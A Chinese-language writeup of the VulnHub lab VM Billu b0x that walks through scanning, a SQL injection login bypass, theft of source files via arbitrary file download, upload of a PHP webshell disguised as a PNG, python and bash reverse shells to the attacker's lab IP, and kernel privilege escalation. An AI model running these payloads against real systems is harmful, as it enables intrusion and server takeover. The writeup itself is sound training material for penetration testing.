---
title: Billu b0x writeup
categories:
  - pentest
tags:
  - Null
---

最近在学习 `渗透测试` ，所以最近会记录一下对靶机的一些渗透思路，由于这是第一次记录渗透的过程，所以我尽量把所有的东西都描述详细一点，如有错误，请大佬联系我。

# 0x1 靶机配置



## 0x11 靶机来源及信息

来源地址：[https://www.vulnhub.com/entry/billu-b0x,188/](https://www.vulnhub.com/entry/billu-b0x,188/)

This Virtual machine is using ubuntu (32 bit)

Other packages used: -

- PHP
- Apache
- MySQL

This virtual machine is having medium difficulty level with tricks.

One need to break into VM using web application and from there escalate privileges to gain root access



## 0x12 靶机配置

从靶机信息中我们可以得到，这是一台 `x32` 的 `ubuntu` ，同时存在一个着一个 `web` 站点。我使用 `VM` 进行打开虚拟机，同时网络设置为 `nat` 。



# 0x2 信息收集



## 0x21 确认靶机 IP 地址

我们需要确认靶机的 `IP` 地址，这里我使用 `netdiscover` 对我这里的网段进行扫描。

```
netdiscover -r 192.168.248.0/24
```

经过简单的判断，我们得到

![Billu_b0x_1.png](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_1.png)

这个 `IP` 地址为我们的靶机。



## 0x22 搜集靶机端口信息

常规操作先用 `nmap` 进行简单测试。

```sh
nmap -T 5 -A 192.168.248.161
```

很快我们便得到常见端口的一些扫描结果。

![Billu_b0x_2.png](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_2.png)

我们得到了两个端口：22、80。

但是我还是不死心，所以准备用 `masscan` 把所有的端口都扫描一次。

```sh
masscan --ports=1-65535 192.168.248.161 --banners --rate 1000000 --wait=0
```

结果如下

![Billu_b0x_3.png](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_3.png)



# 0x3 漏洞挖掘

由于开启了 `web` 服务，所以我决定先从 web 入手进行扫描。

首先，一进入网站就发现一个登陆界面。简单的尝试了一下，发现过滤了 `‘` 。先扫描一下目录吧。

```sh
dirb http://192.168.248.161/ /usr/share/dirb/wordlists/big.txt -r
```

![Billu_b0x_4.png](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_4.png)

发现存在的东西挺多的。

## 0x31 web 漏洞

经过代码审计，总结可得：

| 地址                                    | 信息                                    |
| :-------------------------------------- | --------------------------------------- |
| http://192.168.248.161/add.php          | 是一个假的上传页面                      |
| http://192.168.248.161/in.php           | phpinfo 的页面                          |
| http://192.168.248.161/index.php        | 首页/登陆页面 （存在 SQL 注入）         |
| http://192.168.248.161/panel.php        | 登陆后跳转的页面 （存在文件上传和包含） |
| http://192.168.248.161/phpmy/           | phpmyadmin 的登陆页面                   |
| http://192.168.248.161/show.php         | 什么也没有                              |
| http://192.168.248.161/test.php         | 任意文件下载                            |
| http://192.168.248.161/uploaded_images/ | 通过 panel.php 上传的文件会在这。       |



## 0x32 渗透思路

通过上面搜集到的信息，思路一下就出来了：

1. 可以通过任意文件下载将该网站文件，所有文件进行打包下载下来，通过审计代码绕过过滤，直接登陆网站，进行文件上传和包含。
2. 通过任意文件下载将该网站文件，将 `/etc/passwd` 以及 `/etc/shadow` （看用户权限够不够），或者在已知用户名的情况下通过 `ssh` 爆破密码登陆。
3. 通过任意文件下载当前网站数据库连接文件，得到数据库账号密码，通过 `phpmyadmin` 获取数据库中的信息，登陆网站进行文件上传和包含。
4. 通过任意文件下载 `phpmyadmin` 的默认配置文件，看是否存在什么有趣的东西。



# 0x4 漏洞利用

这里将上面所诉的思路全部实现。

## 0x41 第一种思路

我们要绕过 `SQL` 过滤，首先我们需要将 `index.php` 通过 `test.php` 的任意文件下载漏洞，将其下载到本机进行审计。

需要注意的是，`test.php` 是通过 `post` 接收 `file` 参数的。

`curl http://192.168.248.161/test.php --data file=index.php > index.php`



### 0x411 SQL 注入

由于单引号太多了，引起了解析故障，所以直接放出文件了： [**`index.php`**](/image/2019-04-24-Billu_b0x_writeup/index.php)

很明显了，通过 `str_replace` 将 `un` 和 `ps` 中的 `'` 给替换为空，导致我们无法直接通过 `'` 来控制 `SQL` 语句的闭合。

现在我们来尝试一下绕过，`'`  可以在 `SQL` 中将单引号 [转义](https://baike.baidu.com/item/%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6/86397?fr=aladdin) ，所以我们将POST数据构建为：

`un=or 1=1 -- \#&ps=\&login=let's login`

`SQL` 语句就如下所示，返回真，这样就可以绕过登陆判断了。

`select * from auth where  pass='\' and uname=' or 1=1 -- \';`



### 0x412 文件上传 && 文件包含 && 反弹 shell 

当绕过登陆后，进入到 `panel.php` ，找到一个文件上传：

![Billu_b0x_5.png](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_5.png)

但是发现有过滤，还好上面还有个任意文件下载。

和上面同样的原因，直接放出文件： [**`panel.php`**](/image/2019-04-24-Billu_b0x_writeup/panel.php)

简单的审计一下，发现了漏洞点，任意文件包含漏洞，这里我们可以先上传图片马，然后进行包含。

首先进入绕过登陆，并保存 `cookie`。

`curl http://192.168.248.161/index.php -d "un=or 1=1 -- \#&ps=\&login=let's login" -c cookie.jar`

携带 `cookie` 进行上传文件，这里 `printf` 首先打印的是 `png` 的文件头，由于服务端校验了文件头，所以我们必须对文件头进行伪造。

`printf "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00 <?php system(\$_POST['who']);?>" > shell.png`

`curl http://192.168.248.161/panel.php -F "image=@/root/Desktop/shell.png" -F "name=name" -F "address=address" -F "id=1337" -F "upload=upload" -b cookie.jar -v`

最后执行 `shell`，这里我用的是 `python` 反弹的 `shell` 。

```sh
curl http://192.168.248.161/panel.php -d "load=./uploaded_images/shell.png&continue=contnue&who=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.248.163\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'" -b cookie.jar --output -
```



### 0x413 提权

刚才我们已经得到了返回的 `shell` 。首先 `id` 查看一下权限。

```sh
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

首先先查看一下内核版本

```sh
www-data@indishell:~$ uname -a
Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/Linux
```

得到了内核版本，用 `searchsploit` 搜索一下

![Billu_b0x_6](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_6.png)

这里刚好存在一个提权漏洞，根据脚本的提示我们将文件上传了 `/tmp` 下，进行操作。

![Billu_b0x_7](/image/2019-04-24-Billu_b0x_writeup/Billu_b0x_7.png)

很轻松就拿到了 `root` 权限。



上面留下了一个问题待解决，反弹 `shell` 的时候，这台机器出现了一个很神奇的地方。

```sh
bash -i &> /dev/tcp/192.168.248.163/4444 1>&0 | echo "123456"
```

这里通过 bash 直接反弹 shell 会出现一个报错：

```sh
bash: no job control in this shell
```

暂时先留一个坑在这里，以后在解决。



## 未完待续

